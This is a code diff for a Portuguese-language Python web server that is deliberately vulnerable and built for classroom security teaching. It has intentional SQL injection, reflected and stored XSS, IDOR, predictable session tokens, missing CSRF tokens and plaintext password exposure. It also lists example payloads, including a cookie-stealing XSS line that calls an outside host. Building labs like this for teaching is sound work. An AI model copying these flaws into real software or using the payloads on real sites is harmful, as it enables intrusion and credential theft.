+        partes  = self.path.split("?", 1)
+        caminho = partes[0]
+        qs      = partes[1] if len(partes) > 1 else ""
+        params  = parse_qs(qs, keep_blank_values=True)
 
-    def _processar_cadastro(self, corpo_bytes: bytes, ip: str):
-        """
-        Cadastra novo usuário armazenando a senha em texto puro.
-        Propositalmente vulnerável para demonstração educacional.
-        """
-        cls   = self.__class__
-        dados = parse_qs(corpo_bytes.decode("utf-8", errors="ignore"))
-        nome  = dados.get("usuario", [""])[0].strip()
-        senha = dados.get("senha",   [""])[0].strip()
+        if caminho == "/":
+            corpo = self._rota_inicial(usuario)
+            self._enviar_html(200, corpo)
 
-        if not re.fullmatch(r"[A-Za-zÀ-ÿ ]+", nome):
-            resposta = self._html_resposta_login(
-                False, mensagem="Nome deve conter apenas letras e espaços."
+        elif caminho == "/login":
+            corpo = self._rota_formulario_login()
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/logout":
+            _remover_sessao(cookies)
+            self._redirecionar("/")
+            self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
+            return
+
+        elif caminho == "/produtos":
+            corpo = self._rota_produtos(params)
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/busca":
+            corpo = self._rota_busca(params)
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/comentarios":
+            corpo = self._rota_comentarios()
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/pedidos":
+            corpo = self._rota_pedidos(params)
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/usuarios":
+            corpo = self._rota_usuarios()
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/perfil":
+            corpo = self._rota_perfil(params)
+            self._enviar_html(200, corpo)
+
+        elif caminho == "/api/dados":
+            self._enviar_json(200, {
+                "status": "ok",
+                "versao": "1.0",
+                "servidor": "NetLab Vulneravel",
+                "autenticacao": "nenhuma",
+            })
+            self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
+            return
+
+        elif caminho == "/api/usuarios":
+            # API que expoe todos os dados sem autenticacao
+            linhas, _, _ = banco_servidor.consultar_seguro(
+                "SELECT id, username, password, role FROM users"
             )
-            return 400, resposta, False
-
-        if not senha.isdigit():
-            resposta = self._html_resposta_login(
-                False, mensagem="Senha deve conter apenas números."
-            )
-            return 400, resposta, False
-
-        if nome in cls._usuarios_vuln:
-            resposta = self._html_resposta_login(
-                False, mensagem="Usuário já existe."
-            )
-            return 409, resposta, False
-
-        # Armazena senha em texto puro (intencional — modo vulnerável)
-        cls._usuarios_vuln[nome] = senha
-
-        resposta = self._html_resposta_login(
-            True, mensagem=f"Conta '{nome}' criada. Faça login em /login."
-        )
-        return 201, resposta, False
-
-    def _html_resposta_login(self, sucesso: bool, mensagem: str = "") -> bytes:
-        """Retorna HTML de resposta ao login/cadastro."""
-        cor    = "#2ecc71" if sucesso else "#e74c3c"
-        titulo = "Login permitido" if sucesso else "Acesso negado"
-        detalhe = mensagem or ("Bem-vindo!" if sucesso else "Tente novamente.")
-        html = f"""
-        <html><body style='background:#0f1423;color:#ecf0f1;
-                           font-family:Arial;padding:32px;'>
-        <h2 style='color:{cor};'>{titulo}</h2>
-        <p>{detalhe}</p>
-        <a href='/login' style='color:#3498DB;'>← Voltar ao login</a>
-        &nbsp;·&nbsp;
-        <a href='/signup' style='color:#3498DB;'>Criar conta</a>
-        </body></html>
-        """
-        return html.encode("utf-8")
-
-    def _html_signup(self) -> str:
-        """Gera a página de cadastro vulnerável com aviso didático."""
-        return """<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Criar conta — NetLab</title>
-  <style>
-    body {
-      font-family:'Segoe UI',Roboto,system-ui,sans-serif;
-      background:linear-gradient(145deg,#0a0f1e 0%,#0f1423 100%);
-      color:#e0e4f0; display:flex; justify-content:center; align-items:center;
-      min-height:100vh; padding:16px;
-    }
-    .card {
-      background:rgba(18,26,40,.95); border:1px solid #1e3a5f;
-      border-radius:28px; padding:28px 24px; max-width:440px; width:100%;
-      box-shadow:0 20px 40px -10px rgba(0,0,0,.7);
-    }
-    h1 { margin:0 0 8px; color:#5a9eff; font-size:24px; }
-    .aviso { margin-bottom:12px; color:#e74c3c; font-weight:600; }
-    form { display:flex; flex-direction:column; gap:10px; margin-top:12px; }
-    input { padding:10px 12px; border-radius:10px; border:1px solid #2a4a70;
-            background:#0f1423; color:#e0e4f0; }
-    button { padding:12px; border:none; border-radius:12px;
-             background:#e74c3c; color:#0f1423; font-weight:700; cursor:pointer; }
-    .tip { color:#9fb2c8; font-size:12px; margin-top:4px; }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h1>Criar conta</h1>
-    <div class="aviso">⚠️ Senha armazenada em texto puro</div>
-    <form method="POST" action="/signup">
-      <input type="text" name="usuario" placeholder="Nome (letras e espaço)"
-             pattern="[A-Za-zÀ-ÿ ]+" required>
-      <input type="password" name="senha" placeholder="Senha numérica"
-             pattern="\\d+" required>
-      <div class="tip">Nome: apenas letras e espaço. Senha: apenas números.</div>
-      <button type="submit">Criar</button>
-    </form>
-    <div style="margin-top:12px;">
-      <a style="color:#3498DB;" href="/login">Voltar ao login</a>
-    </div>
-  </div>
-</body>
-</html>"""
-
-    # ─────────────────────────────────────────────────────────────────────
-    # Rate limiting didático contra DoS (independente do login)
-    # ─────────────────────────────────────────────────────────────────────
-
-    def _verificar_limite(self, ip: str):
-        """
-        Aplica rate limit por IP (proteção didática opcional contra sobrecarga).
-        Retorna (permitido, ttl_bloqueio, reqs_atual).
-        """
-        cls = self.__class__
-        if not cls._protecao_ativa or cls._limite_req_por_seg <= 0:
-            return True, 0, 0
-
-        agora = time.time()
-        with cls._lock:
-            # Verifica bloqueio ativo
-            expira = cls._ip_bloqueado_ate.get(ip, 0)
-            if expira and expira > agora:
-                return False, int(expira - agora), len(cls._timestamps_por_ip[ip])
-            if expira and expira <= agora:
-                cls._ips_bloqueados.discard(ip)
-                cls._ip_bloqueado_ate.pop(ip, None)
-
-            # Janela deslizante de 1 segundo
-            cls._timestamps_por_ip[ip] = [
-                t for t in cls._timestamps_por_ip[ip]
-                if agora - t < 1.0
+            dados = [
+                {"id": r[0], "username": r[1], "password": r[2], "role": r[3]}
+                for r in linhas
             ]
-            cls._timestamps_por_ip[ip].append(agora)
-            reqs_por_seg = len(cls._timestamps_por_ip[ip])
-
-            if reqs_por_seg > cls._limite_req_por_seg:
-                cls._ips_bloqueados.add(ip)
-                cls._ip_bloqueado_ate[ip] = agora + cls._tempo_bloqueio
-                sinais_servidor.alerta_emitido.emit(
-                    f"🚫 IP {ip} bloqueado por {cls._tempo_bloqueio}s após "
-                    f"{reqs_por_seg} req/s (limite: {cls._limite_req_por_seg} req/s)"
-                )
-                return False, cls._tempo_bloqueio, reqs_por_seg
-
-        return True, 0, reqs_por_seg
-
-    def _servir_bloqueado(self):
-        """Retorna HTTP 429 quando o IP está bloqueado por excesso de requisições."""
-        corpo = (
-            b"<html><body style='background:#0f1423;color:#E74C3C;"
-            b"font-family:Arial;padding:40px;text-align:center;'>"
-            b"<h2>Acesso Bloqueado</h2>"
-            b"<p>Seu IP foi temporariamente bloqueado por excesso de requisicoes.</p>"
-            b"<p style='color:#7f8c8d;'>Esta e uma demonstracao educacional de "
-            b"protecao contra DoS.</p>"
-            b"</body></html>"
-        )
-        self.send_response(429)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(corpo)))
-        self.send_header("Retry-After", str(self.__class__._tempo_bloqueio))
-        self.end_headers()
-        self.wfile.write(corpo)
-
-    def _registrar(self, ip: str, metodo: str, path: str,
-                   tamanho: int, inicio: float,
-                   corpo: str = "", bloqueado: bool = False,
-                   reqs_por_seg: Optional[int] = None):
-        """Registra a requisição e emite sinal para a UI."""
-        tempo_ms = int((time.time() - inicio) * 1000)
-        agora    = time.time()
-        cls      = self.__class__
-
-        if reqs_por_seg is None:
-            reqs_por_seg = len([
-                t for t in cls._timestamps_por_ip[ip]
-                if agora - t < 1.0
-            ])
-
-        cls._contagem_por_ip[ip] += 1
-
-        # Alerta educacional quando há sobrecarga
-        if reqs_por_seg >= 10:
+            self._enviar_json(200, {"usuarios": dados, "total": len(dados)})
             sinais_servidor.alerta_emitido.emit(
-                f"⚠️ ALERTA: {ip} enviou {reqs_por_seg} requisições/segundo! "
-                f"Possível teste de carga ou ataque DoS."
+                f"[DIVULGACAO] /api/usuarios acessado por {ip_cliente} — "
+                f"todos os usuarios e senhas expostos via JSON"
+            )
+            self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
+            return
+
+        else:
+            corpo = self._pagina_base(
+                "404",
+                '<div class="card"><h1>404 - Pagina nao encontrada</h1>'
+                '<p><a href="/">Voltar ao inicio</a></p></div>'
+            )
+            self._enviar_html(404, corpo)
+
+        self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
+
+    # -----------------------------------------------------------------------
+    # Roteamento de requisicoes POST
+    # -----------------------------------------------------------------------
+
+    def do_POST(self):
+        """Processa todas as requisicoes HTTP POST e roteia para os handlers."""
+        ts_inicio  = time.time()
+        ip_cliente = self.client_address[0]
+
+        partes  = self.path.split("?", 1)
+        caminho = partes[0]
+
+        tamanho     = int(self.headers.get("Content-Length", 0))
+        corpo_bytes = self.rfile.read(tamanho)
+        corpo_texto = corpo_bytes.decode("utf-8", errors="replace")
+        params      = parse_qs(corpo_texto, keep_blank_values=True)
+
+        if caminho == "/login":
+            corpo, cookie_novo = self._processar_login(params, ip_cliente)
+            if cookie_novo:
+                self._enviar_html(200, corpo, cookie=cookie_novo)
+            else:
+                self._enviar_html(200, corpo)
+
+        elif caminho == "/comentarios":
+            corpo = self._processar_comentario(params, ip_cliente)
+            self._enviar_html(200, corpo)
+
+        else:
+            corpo = self._pagina_base(
+                "404",
+                '<div class="card"><h1>404</h1></div>'
+            )
+            self._enviar_html(404, corpo)
+
+        self._registrar(ip_cliente, "POST", caminho, tamanho, ts_inicio,
+                        corpo=corpo_texto[:400])
+
+    # -----------------------------------------------------------------------
+    # Rotas — implementacoes das paginas vulneraveis
+    # -----------------------------------------------------------------------
+
+    def _rota_inicial(self, usuario: str) -> str:
+        """Pagina inicial com mapa completo das vulnerabilidades disponíveis."""
+        bloco_sessao = ""
+        if usuario:
+            bloco_sessao = (
+                f'<div class="sucesso">Sessao ativa: <strong>{usuario}</strong> '
+                f'— token de sessao previsivel (sequencial) &nbsp; '
+                f'<a href="/logout">[encerrar sessao]</a></div>'
             )
 
-        sinais_servidor.requisicao_recebida.emit({
+        conteudo = f"""
+        <div class="card">
+            <h1>NetLab - Servidor de Aplicacao Vulneravel</h1>
+            {bloco_sessao}
+            <div class="info">
+                Servidor HTTP educacional com vulnerabilidades web reais para estudo em sala de aula.<br>
+                Escopo restrito: banco de dados em memoria e aplicacao web HTTP.<br>
+                Nenhum acesso ao sistema operacional. Dados descartados ao encerrar.
+            </div>
+            <h2>Mapa de Vulnerabilidades</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tipo</th>
+                        <th>Endpoint</th>
+                        <th>Descricao</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="badge badge-sqli">SQL Injection</span></td>
+                        <td><a href="/login">/login</a> (POST)</td>
+                        <td>Login sem parametrizacao — bypass de autenticacao e extracao de dados</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-sqli">SQL Injection</span></td>
+                        <td><a href="/produtos?id=1">/produtos?id=1</a></td>
+                        <td>Busca por ID via UNION SELECT — extrai dados de outras tabelas</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-xss">XSS Refletido</span></td>
+                        <td><a href="/busca">/busca?q=</a></td>
+                        <td>Parametro refletido sem escape HTML — execucao de JavaScript no cliente</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-xss">XSS Refletido</span></td>
+                        <td><a href="/perfil?nome=visitante">/perfil?nome=</a></td>
+                        <td>Parametro nome inserido diretamente no HTML — XSS via URL</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-xss">XSS Armazenado</span></td>
+                        <td><a href="/comentarios">/comentarios</a></td>
+                        <td>Comentarios salvos no banco e exibidos sem escape — afeta todos os visitantes</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-idor">IDOR</span></td>
+                        <td><a href="/pedidos?id=1">/pedidos?id=1</a></td>
+                        <td>Qualquer pedido acessivel por ID sem verificar autorizacao</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-info">Divulgacao</span></td>
+                        <td><a href="/usuarios">/usuarios</a></td>
+                        <td>Lista completa de usuarios e senhas em texto puro sem autenticacao</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-info">Divulgacao</span></td>
+                        <td><a href="/api/usuarios">/api/usuarios</a></td>
+                        <td>API JSON expoe credenciais sem autenticacao nem controle de acesso</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-csrf">CSRF</span></td>
+                        <td>Todos os formularios</td>
+                        <td>Formularios sem tokens CSRF — requisicoes forjadas de outros sites sao aceitas</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-brute">Forca Bruta</span></td>
+                        <td><a href="/login">/login</a></td>
+                        <td>Sem limite de tentativas — qualquer automacao pode enumerar senhas</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-idor">Sessao IDOR</span></td>
+                        <td><code>Cookie: sessao=tokenN</code></td>
+                        <td>Tokens de sessao sequenciais — adivinhavel por enumeracao</td>
+                    </tr>
+                    <tr>
+                        <td><span class="badge badge-info">Erro SQL</span></td>
+                        <td>Varios endpoints</td>
+                        <td>Erros do banco de dados divulgados diretamente ao usuario</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="card">
+            <h2>Payloads de exemplo para explorar</h2>
+            <pre>
+SQL Injection — bypass de login (campo usuario):
+  admin' --
+  ' OR '1'='1' --
+  ' OR 1=1--
+  admin'/*
+
+SQL Injection — extracao via UNION (campo ?id= em /produtos):
+  /produtos?id=1 UNION SELECT id,username,password FROM users--
+  /produtos?id=999 UNION SELECT 1,username,password FROM users--
+
+XSS Refletido (/busca?q= ou /perfil?nome=):
+  &lt;script&gt;alert('XSS')&lt;/script&gt;
+  &lt;img src=x onerror=alert(document.cookie)&gt;
+  &lt;svg onload=alert(1)&gt;
+
+XSS Armazenado (/comentarios — campo Comentario):
+  &lt;script&gt;alert('XSS armazenado')&lt;/script&gt;
+  &lt;img src=x onerror=fetch('http://192.168.x.x/steal?c='+document.cookie)&gt;
+
+IDOR — pedidos sem autorizacao:
+  /pedidos?id=1   /pedidos?id=2   /pedidos?id=3   ...
+
+Sessao previsivel:
+  Apos login: cookie = sessao=token1 (sequencial e adivinhavel)
+
+Forca bruta:
+  POST /login com usuario=admin e senhas do dicionario — sem limite</pre>
+        </div>
+        """
+        return self._pagina_base("Inicio", conteudo)
+
+    def _rota_formulario_login(self, mensagem: str = "", tipo_msg: str = "") -> str:
+        """
+        Formulario de login.
+
+        Vulnerabilidades presentes:
+        - Sem token CSRF (formulario forjavel de outro site)
+        - Sem limite de tentativas (forca bruta irrestrita)
+        - Query vulneravel a SQL Injection no processamento POST
+        """
+        bloco_msg = ""
+        if mensagem:
+            classe = "aviso" if tipo_msg == "erro" else "sucesso"
+            bloco_msg = f'<div class="{classe}">{mensagem}</div>'
+
+        conteudo = f"""
+        <div class="card" style="max-width: 500px;">
+            <h1>Login</h1>
+            <div class="aviso">
+                Vulnerabilidades ativas:<br>
+                - SQL Injection no usuario/senha (sem parametrizacao)<br>
+                - Sem token CSRF (requisicao forjavel)<br>
+                - Sem limite de tentativas (forca bruta irrestrita)
+            </div>
+            <div class="info">
+                Exemplo de SQL Injection: usuario <code>admin' --</code> com qualquer senha.<br>
+                Usuarios registrados: admin, alice, bob, carlos<br>
+                (senhas visiveis em <a href="/usuarios">/usuarios</a>)
+            </div>
+            {bloco_msg}
+            <!-- SEM TOKEN CSRF — VULNERABILIDADE INTENCIONAL -->
+            <form method="POST" action="/login">
+                <label>Usuario</label>
+                <input type="text" name="usuario" placeholder="admin' --" autocomplete="off">
+                <label>Senha</label>
+                <input type="password" name="senha" placeholder="qualquer coisa">
+                <input type="submit" value="Entrar">
+            </form>
+        </div>
+        """
+        return self._pagina_base("Login", conteudo)
+
+    def _processar_login(self, params: dict, ip_cliente: str) -> tuple:
+        """
+        Processa o POST de login.
+
+        VULNERABILIDADE REAL — SQL Injection:
+          Query construida por concatenacao direta sem parametrizacao.
+          Payload 'admin' --' ignora a verificacao de senha.
+          Payload ' OR '1'='1' --  autentica qualquer usuario.
+
+        VULNERABILIDADE REAL — Forca Bruta:
+          Sem delay, sem contador de tentativas, sem CAPTCHA.
+        """
+        usuario = params.get("usuario", [""])[0]
+        senha   = params.get("senha",   [""])[0]
+
+        if not usuario:
+            return self._rota_formulario_login("Informe o usuario.", "erro"), None
+
+        # Detecta e alerta (sem bloquear — a exploracao deve funcionar)
+        if _detectar_sqli(usuario) or _detectar_sqli(senha):
+            sinais_servidor.alerta_emitido.emit(
+                f"[SQL INJECTION] {ip_cliente} — payload no login: "
+                f"usuario='{usuario[:60]}'"
+            )
+
+        # VULNERABILIDADE REAL: concatenacao direta sem parametrizacao
+        query_vulneravel = (
+            f"SELECT id, username, role FROM users "
+            f"WHERE username = '{usuario}' AND password = '{senha}'"
+        )
+
+        linhas, _, erro = banco_servidor.consultar_vulneravel(query_vulneravel)
+
+        if erro:
+            # VULNERABILIDADE REAL: erro do banco divulgado ao usuario
+            conteudo = f"""
+            <div class="card">
+                <h1>Erro no banco de dados</h1>
+                <div class="aviso">
+                    Erro SQLite divulgado (information disclosure):
+                </div>
+                <pre>{erro}</pre>
+                <pre>Query executada:\n{query_vulneravel}</pre>
+                <a href="/login">Tentar novamente</a>
+            </div>
+            """
+            return self._pagina_base("Erro", conteudo), None
+
+        if linhas:
+            id_usuario, nome_usuario, papel = linhas[0]
+            token = _criar_sessao(nome_usuario)
+
+            via_injecao = _detectar_sqli(usuario)
+            metodo_acesso = "SQL Injection" if via_injecao else "credenciais validas"
+
+            conteudo = f"""
+            <div class="card">
+                <h1>Login bem-sucedido</h1>
+                <div class="sucesso">
+                    Autenticado como: <strong>{nome_usuario}</strong>
+                    (papel: {papel}) — via {metodo_acesso}
+                </div>
+                <p>Token de sessao: <code>{token}</code>
+                   (token sequencial — previsivel por enumeracao)</p>
+                <br>
+                <pre>Query executada (vulneravel):\n{query_vulneravel}\n\nResultado retornado: {linhas}</pre>
+                <br>
+                <a href="/">Ir para o inicio</a> &nbsp;|&nbsp;
+                <a href="/usuarios">Ver todos os usuarios</a> &nbsp;|&nbsp;
+                <a href="/pedidos?id=1">Ver pedidos (IDOR)</a> &nbsp;|&nbsp;
+                <a href="/logout">Encerrar sessao</a>
+            </div>
+            """
+            return self._pagina_base("Login", conteudo), f"sessao={token}; Path=/"
+
+        return self._rota_formulario_login(
+            f"Credenciais invalidas.<br>"
+            f"<small style='color:#7f8c8d;'>Query executada: "
+            f"<code>{query_vulneravel}</code></small>",
+            "erro"
+        ), None
+
+    def _rota_produtos(self, params: dict) -> str:
+        """
+        Lista produtos ou busca por ID.
+
+        VULNERABILIDADE REAL — SQL Injection:
+          O parametro ?id= e concatenado diretamente na query.
+          UNION SELECT permite extrair dados de qualquer tabela.
+          Ex: /produtos?id=1 UNION SELECT id,username,password FROM users--
+        """
+        produto_id = params.get("id", [""])[0].strip()
+
+        if not produto_id:
+            # Lista todos os produtos (esta consulta e segura)
+            linhas, _, _ = banco_servidor.consultar_seguro(
+                "SELECT id, name, price FROM products ORDER BY id"
+            )
+            linhas_html = "".join(
+                f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>R$ {r[2]:.2f}</td>"
+                f"<td><a href='/produtos?id={r[0]}'>Detalhar</a></td></tr>"
+                for r in linhas
+            )
+            conteudo = f"""
+            <div class="card">
+                <h1>Catalogo de Produtos</h1>
+                <div class="aviso">
+                    Vulnerabilidade SQL Injection ativa no parametro <code>?id=</code>.<br>
+                    Teste: <a href="/produtos?id=1 UNION SELECT id,username,password FROM users--">
+                    /produtos?id=1 UNION SELECT id,username,password FROM users--</a>
+                </div>
+                <table>
+                    <thead>
+                        <tr><th>ID</th><th>Nome</th><th>Preco</th><th>Acao</th></tr>
+                    </thead>
+                    <tbody>{linhas_html}</tbody>
+                </table>
+            </div>
+            """
+            return self._pagina_base("Produtos", conteudo)
+
+        # Alerta didatico (sem bloqueio)
+        if _detectar_sqli(produto_id):
+            sinais_servidor.alerta_emitido.emit(
+                f"[SQL INJECTION] /produtos?id=: '{produto_id[:80]}'"
+            )
+
+        # VULNERABILIDADE REAL: concatenacao direta sem parametrizacao
+        query_vulneravel = (
+            f"SELECT id, name, price FROM products WHERE id = {produto_id}"
+        )
+
+        linhas, descricao, erro = banco_servidor.consultar_vulneravel(query_vulneravel)
+
+        if erro:
+            conteudo = f"""
+            <div class="card">
+                <h1>Erro no banco de dados</h1>
+                <div class="aviso">Erro divulgado ao usuario (information disclosure):</div>
+                <pre>{erro}</pre>
+                <pre>Query executada:\n{query_vulneravel}</pre>
+                <a href="/produtos">Voltar ao catalogo</a>
+            </div>
+            """
+            return self._pagina_base("Erro SQL", conteudo)
+
+        if not linhas:
+            conteudo = f"""
+            <div class="card">
+                <h1>Nenhum resultado</h1>
+                <div class="aviso">Nenhum produto encontrado para o id informado.</div>
+                <pre>Query executada:\n{query_vulneravel}</pre>
+                <a href="/produtos">Ver todos os produtos</a>
+            </div>
+            """
+            return self._pagina_base("Produto", conteudo)
+
+        # Colunas retornadas (podem ser de outra tabela via UNION SELECT)
+        nomes_colunas = [d[0] for d in descricao] if descricao else ["col1", "col2", "col3"]
+        cab_html  = "".join(f"<th>{c}</th>" for c in nomes_colunas)
+        # Dados inseridos sem escape — XSS possivel se o banco foi injetado com scripts
+        corpo_html = ""
+        for linha in linhas:
+            corpo_html += "<tr>" + "".join(f"<td>{v}</td>" for v in linha) + "</tr>"
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Resultado da Consulta</h1>
+            <div class="aviso">
+                O resultado abaixo pode conter dados de outras tabelas
+                se UNION SELECT foi utilizado no parametro ?id=.
+            </div>
+            <pre>Query executada:\n{query_vulneravel}</pre>
+            <br>
+            <table>
+                <thead><tr>{cab_html}</tr></thead>
+                <tbody>{corpo_html}</tbody>
+            </table>
+            <br>
+            <a href="/produtos">Voltar ao catalogo</a>
+        </div>
+        """
+        return self._pagina_base("Produto", conteudo)
+
+    def _rota_busca(self, params: dict) -> str:
+        """
+        Pagina de busca de produtos.
+
+        VULNERABILIDADE REAL — XSS Refletido:
+          O parametro ?q= e inserido diretamente no HTML sem nenhum escape.
+          Payloads como <script>alert(1)</script> sao executados imediatamente.
+        """
+        # Valor do parametro recebido diretamente — sem nenhum tratamento
+        termo_bruto = params.get("q", [""])[0]
+
+        if _detectar_xss(termo_bruto):
+            sinais_servidor.alerta_emitido.emit(
+                f"[XSS REFLETIDO] /busca?q=: '{termo_bruto[:80]}'"
+            )
+
+        bloco_resultado = ""
+        if termo_bruto:
+            # A busca em si usa parametrizacao para evitar SQL Injection neste campo
+            # A vulnerabilidade esta na EXIBICAO do termo, nao na busca
+            linhas, _, _ = banco_servidor.consultar_seguro(
+                "SELECT id, name, price FROM products WHERE name LIKE ?",
+                (f"%{termo_bruto}%",)
+            )
+            if linhas:
+                linhas_html = "".join(
+                    f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>R$ {r[2]:.2f}</td></tr>"
+                    for r in linhas
+                )
+                tabela = (
+                    f"<table><thead><tr><th>ID</th><th>Nome</th><th>Preco</th></tr></thead>"
+                    f"<tbody>{linhas_html}</tbody></table>"
+                )
+            else:
+                tabela = "<p style='color:#7f8c8d;'>Nenhum produto encontrado.</p>"
+
+            # XSS REAL: termo_bruto inserido diretamente no HTML sem escape algum
+            bloco_resultado = f"<p>Resultados para: <strong>{termo_bruto}</strong></p><br>{tabela}"
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Busca de Produtos</h1>
+            <div class="aviso">
+                XSS Refletido ativo: o parametro <code>?q=</code> e refletido
+                no HTML sem escape — scripts no parametro sao executados.
+            </div>
+            <div class="info">
+                Exemplos: <code>/busca?q=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                <code>/busca?q=&lt;img src=x onerror=alert(document.cookie)&gt;</code>
+            </div>
+            <form method="GET" action="/busca">
+                <label>Termo de busca</label>
+                <input type="text" name="q" placeholder="Nome do produto">
+                <button type="submit">Buscar</button>
+            </form>
+            <br>
+            {bloco_resultado}
+        </div>
+        """
+        return self._pagina_base("Busca", conteudo)
+
+    def _rota_comentarios(self) -> str:
+        """
+        Exibe e permite postar comentarios.
+
+        VULNERABILIDADE REAL — XSS Armazenado:
+          Comentarios sao armazenados no banco sem sanitizacao e
+          exibidos no HTML sem escape. Scripts afetam todos os visitantes.
+
+        VULNERABILIDADE REAL — CSRF:
+          Formulario sem token CSRF — qualquer site pode submeter comentarios
+          em nome de um usuario autenticado.
+        """
+        linhas, _, _ = banco_servidor.consultar_seguro(
+            "SELECT id, author, content, created_at FROM comments ORDER BY id DESC"
+        )
+
+        # XSS REAL: content exibido sem escape — scripts armazenados sao executados
+        comentarios_html = ""
+        for linha in linhas:
+            _, autor, conteudo_comentario, criado_em = linha
+            comentarios_html += f"""
+            <div class="comentario-item">
+                <div class="comentario-autor">{autor or "anonimo"} — {criado_em or ""}</div>
+                <!-- XSS ARMAZENADO: conteudo sem escape HTML -->
+                <div>{conteudo_comentario}</div>
+            </div>
+            """
+
+        if not comentarios_html:
+            comentarios_html = "<p style='color:#7f8c8d;'>Nenhum comentario ainda.</p>"
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Comentarios</h1>
+            <div class="aviso">
+                Vulnerabilidades ativas:<br>
+                - XSS Armazenado: comentarios exibidos sem escape HTML<br>
+                - CSRF: formulario sem token de protecao<br>
+                - SQL Injection: INSERT por concatenacao direta (autor e conteudo)
+            </div>
+            <div class="info">
+                Teste XSS Armazenado — poste este payload no campo Comentario:<br>
+                <code>&lt;script&gt;alert('XSS armazenado!')&lt;/script&gt;</code><br>
+                Depois recarregue a pagina — o script executa para todos os visitantes.
+            </div>
+            <!-- SEM TOKEN CSRF — VULNERABILIDADE INTENCIONAL -->
+            <form method="POST" action="/comentarios">
+                <label>Nome (opcional)</label>
+                <input type="text" name="autor" placeholder="Anonimo">
+                <label>Comentario</label>
+                <textarea name="conteudo" placeholder="Digite aqui..."></textarea>
+                <button type="submit">Publicar</button>
+            </form>
+        </div>
+        <div class="card">
+            <h2>Comentarios publicados</h2>
+            {comentarios_html}
+        </div>
+        """
+        return self._pagina_base("Comentarios", conteudo)
+
+    def _processar_comentario(self, params: dict, ip_cliente: str) -> str:
+        """
+        Armazena um comentario no banco sem nenhuma sanitizacao.
+
+        VULNERABILIDADE REAL — XSS Armazenado:
+          O conteudo e inserido via SQL com concatenacao (SQL Injection tambem presente)
+          e armazenado no banco. Ao ser exibido, scripts sao executados no browser.
+        """
+        autor    = params.get("autor",    ["anonimo"])[0][:100]
+        conteudo = params.get("conteudo", [""])[0]
+
+        if not conteudo.strip():
+            return self._rota_comentarios()
+
+        if _detectar_xss(conteudo) or _detectar_xss(autor):
+            sinais_servidor.alerta_emitido.emit(
+                f"[XSS ARMAZENADO] {ip_cliente} — payload em comentario: "
+                f"'{conteudo[:80]}'"
+            )
+
+        if _detectar_sqli(conteudo) or _detectar_sqli(autor):
+            sinais_servidor.alerta_emitido.emit(
+                f"[SQL INJECTION] {ip_cliente} — payload em INSERT de comentario: "
+                f"'{conteudo[:80]}'"
+            )
+
+        agora = datetime.now().strftime("%H:%M:%S")
+
+        # VULNERABILIDADE REAL: INSERT com concatenacao direta (SQL Injection + XSS armazenado)
+        query_vulneravel = (
+            f"INSERT INTO comments (author, content, created_at) "
+            f"VALUES ('{autor}', '{conteudo}', '{agora}')"
+        )
+        sucesso, erro = banco_servidor.modificar_vulneravel(query_vulneravel)
+
+        if not sucesso:
+            conteudo_html = f"""
+            <div class="card">
+                <h1>Erro ao publicar comentario</h1>
+                <div class="aviso">Erro SQL divulgado (information disclosure): {erro}</div>
+                <pre>Query executada:\n{query_vulneravel}</pre>
+                <a href="/comentarios">Tentar novamente</a>
+            </div>
+            """
+            return self._pagina_base("Erro", conteudo_html)
+
+        return self._rota_comentarios()
+
+    def _rota_pedidos(self, params: dict) -> str:
+        """
+        Exibe detalhes de um pedido por ID.
+
+        VULNERABILIDADE REAL — IDOR (Insecure Direct Object Reference):
+          Qualquer pedido pode ser acessado sem verificar se o usuario logado
+          e o dono. Nao ha autenticacao nem controle de acesso.
+        """
+        try:
+            pedido_id = int(params.get("id", ["1"])[0].strip())
+        except (ValueError, IndexError):
+            pedido_id = 1
+
+        # IDOR REAL: nenhuma verificacao de autorizacao
+        # Qualquer ID entre 1 e N retorna dados de outro usuario
+        linhas, _, _ = banco_servidor.consultar_seguro(
+            """SELECT o.id, u.username, u.role,
+                      p.name, p.price, o.quantity,
+                      (p.price * o.quantity) AS total
+               FROM orders o
+               JOIN users    u ON o.user_id    = u.id
+               JOIN products p ON o.product_id = p.id
+               WHERE o.id = ?""",
+            (pedido_id,)
+        )
+
+        # Lista todos os IDs disponiveis para navegacao facil
+        todos_ids, _, _ = banco_servidor.consultar_seguro(
+            "SELECT id FROM orders ORDER BY id"
+        )
+        navegacao = " ".join(
+            f"<a href='/pedidos?id={r[0]}'>[{r[0]}]</a>"
+            for r in todos_ids
+        )
+
+        if not linhas:
